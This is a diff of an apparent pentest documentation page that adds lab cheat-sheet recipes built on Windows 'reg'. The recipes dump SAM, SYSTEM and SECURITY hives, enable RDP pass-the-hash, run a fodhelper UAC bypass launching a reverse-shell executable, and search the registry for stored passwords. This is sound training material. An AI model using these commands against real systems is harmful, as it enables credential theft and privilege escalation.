@@ -11,6 +11,8 @@ hideFooterPagination: true
 
 Replace UPPER_CASE values with your lab values.
 
+[Search this tool’s saved examples](/commands/notebook?tool=reg) · [All tools](/index)
+
 ## Autologon configuration
 
 **Windows cmd.exe or PowerShell**
@@ -42,10 +44,228 @@ Transfer both files to Kali first.
 
 [Find another command](/index) · [Ports](/enumeration/ports-cheatsheet)
 
-[More saved commands for this tool](https://dashboard-aed21664.mintlify.site/find-anything?q=reg)
+## Notebook recipes
 
-## Learning and original examples
+15 additional examples, grouped by task. Saved as written; prompts, output, original lab values and older syntax may be included.
 
-- [Password Attacks: Cracking, Files, and Credential Stores](/password-attacks/password-attacks-cheat-sheet)
+<AccordionGroup>
+
+<Accordion title="RDP Pass-the-Hash (PtH)">
+
+### RDP Pass-the-Hash (PtH)
+
+**Common Services: Full Module Reference**
+
+```cmd
+C:\htb> reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
+
+Registry Editor showing path: HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa. Highlighted entry: DisableRestrictedAdmin, REG_DWORD, value 0.
+```
+
+</Accordion>
+
+<Accordion title="High-value Windows locations">
+
+### High-value Windows locations
+
+**Find Credentials on Windows**
+
+```cmd
+reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
+```
+
+</Accordion>
+
+<Accordion title="RDP — PtH for GUI access (xfreerdp)">
+
+### RDP — PtH for GUI access (xfreerdp)
+
+**Pass the Hash from Linux and Windows**
+
+```cmd
+reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
+```
+
+</Accordion>
+
+<Accordion title="11. Attacking SAM, SYSTEM &amp; SECURITY">
+
+### 11. Attacking SAM, SYSTEM & SECURITY
+
+**Password Attacks: Cracking, Files, and Credential Stores**
+
+```cmd
+reg.exe save hklm\sam C:\sam.save
+reg.exe save hklm\system C:\system.save
+reg.exe save hklm\security C:\security.save
+```
+
+</Accordion>
+
+<Accordion title="C. SeBackup / SeRestore → read any file">
+
+### C. SeBackup / SeRestore → read any file
+
+**Windows Post-Exploitation: Field Reference**
+
+```cmd
+:: grab SAM + SYSTEM (local account hashes)
+reg save HKLM\SAM  C:\Temp\SAM
+reg save HKLM\SYSTEM C:\Temp\SYSTEM
+:: on a DC, snapshot NTDS via diskshadow + robocopy /b (backup mode), then:
+:: on Kali:  impacket-secretsdump -sam SAM -system SYSTEM LOCAL
+```
+
+</Accordion>
+
+<Accordion title="F. UAC bypass (admin but Medium integrity)">
+
+### F. UAC bypass (admin but Medium integrity)
+
+**Windows Post-Exploitation: Field Reference**
+
+```cmd
+:: fodhelper bypass (classic)
+reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ /d "" /f
+reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /ve /t REG_SZ /d "cmd.exe /c C:\Temp\rev.exe" /f
+fodhelper.exe
+```
+
+</Accordion>
+
+<Accordion title="PHASE B — PrivEsc enumeration">
+
+### PHASE B — PrivEsc enumeration
+
+**Windows Post-Exploitation: Field Reference**
+
+```cmd
+:: Unquoted service paths (space in path + no quotes = hijack)
+wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /iv "c:\windows\\" | findstr /iv """
+:: AlwaysInstallElevated (any .msi runs as SYSTEM if both keys = 1)
+reg query HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+reg query HKCU\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+:: Stored AutoLogon creds (cleartext!)
+reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
+:: Saved creds you can reuse without knowing them
+cmdkey /list
+:: Scheduled tasks (look for writable scripts run by SYSTEM)
+schtasks /query /fo LIST /v | findstr /i "TaskName Run As User Task To Run"
+```
+
+</Accordion>
+
+<Accordion title="AlwaysInstallElevated">
+
+### AlwaysInstallElevated
+
+**Windows Privilege Escalation: Full Checklist**
+
+```powershell
+reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+```
+
+**Windows Privilege Escalation: Full Checklist**
+
+Context from the notebook: Using the  reg query  command, you can check the status of the  AlwaysInstallElevated  registry key for both the user and the machine. If both queries return a value of  0x1 , then  AlwaysInstallElevated  is enabled for both user and machine, indicating the system is vulnerable.
+
+```text
+reg query
+```
+
+</Accordion>
+
+<Accordion title="EoP - Processes Enumeration and Tasks">
+
+### EoP - Processes Enumeration and Tasks
+
+**Windows Privilege Escalation: Full Checklist**
+
+```powershell
+REG QUERY "HKLM\SOFTWARE\Microsoft\PowerShell\1\PowerShellEngine" /v PowerShellVersion
+```
+
+**Windows Privilege Escalation: Full Checklist**
+
+```powershell
+wmic startup get caption,command
+reg query HKLM\Software\Microsoft\Windows\CurrentVersion\R
+reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
+reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
+dir "C:\Documents and Settings\All Users\Start Menu\Programs\Startup"
+dir "C:\Documents and Settings\%username%\Start Menu\Programs\Startup"
+```
+
+</Accordion>
+
+<Accordion title="Network Enumeration">
+
+### Network Enumeration
+
+**Windows Privilege Escalation: Full Checklist**
+
+```powershell
+reg query HKLM\SYSTEM\CurrentControlSet\Services\SNMP /s
+Get-ChildItem -path HKLM:\SYSTEM\CurrentControlSet\Services\SNMP -Recurse
+```
+
+</Accordion>
+
+<Accordion title="Search the registry for key names and passwords">
+
+### Search the registry for key names and passwords
+
+**Windows Privilege Escalation: Full Checklist**
+
+```powershell
+REG QUERY HKLM /F "password" /t REG_SZ /S /K
+REG QUERY HKCU /F "password" /t REG_SZ /S /K
+
+reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" # Windows Autologin
+reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr "DefaultUserName DefaultDomainName DefaultPassword" 
+reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP" # SNMP parameters
+reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" # Putty clear text proxy credentials
+reg query "HKCU\Software\ORL\WinVNC3\Password" # VNC credentials
+reg query HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4 /v password
+
+reg query HKLM /f password /t REG_SZ /s
+reg query HKCU /f password /t REG_SZ /s
+```
+
+</Accordion>
+
+<Accordion title="The core idea: secrets, not passwords">
+
+### The core idea: secrets, not passwords
+
+**Windows Authentication: NTLM and Kerberos**
+
+Context from the notebook: SAM  ( HKLM\SAM ) NT hashes of  local  accounts reg save , Mimikatz  lsadump::sam , secretsdump (local)
+
+```text
+reg save
+```
+
+</Accordion>
+
+<Accordion title="🧾 QUICK REFERENCE — &quot;I see X → do Y&quot;">
+
+### 🧾 QUICK REFERENCE — "I see X → do Y"
+
+**Windows Post-Exploitation: Field Reference**
+
+Context from the notebook: SeBackupPrivilege reg save SAM/SYSTEM  → secretsdump LOCAL
+
+```text
+reg save SAM/SYSTEM
+```
+
+</Accordion>
+
+</AccordionGroup>
+
+## Related tools and references
+
 - [WDigest — plaintext missing](/commands/wdigest)
 - [secretsdump.py](/commands/secretsdump)
